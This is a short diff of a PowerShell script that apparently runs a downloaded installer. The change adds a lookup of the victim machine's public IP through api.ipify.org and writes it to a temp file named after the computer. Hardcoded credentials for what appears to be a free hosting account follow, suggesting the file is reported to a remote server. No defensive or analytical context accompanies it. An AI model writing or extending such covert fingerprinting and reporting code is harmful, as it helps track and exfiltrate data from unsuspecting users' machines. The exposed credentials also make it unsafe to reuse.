@@ -24,11 +24,8 @@ catch {
 }
 
 Start-Process $FilePath -Wait
-$rand = Get-Random -Maximum 99999999
-$isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
-$FilePath = if ($isAdmin) { "$env:SystemRoot\Temp\Install_$rand.exe" } else { "$env:TEMP\Install_$rand.exe" }
-
-Set-Content "$env:TEMP\$env:computername.txt" '$env:computername'
+$IpWan = Invoke-RestMethod 'https://api.ipify.org'
+Set-Content "$env:TEMP\$env:computername.txt" $IpWan
 
 $Username = "ezyro_35592799"
 $Password = "c04d2d479e4"
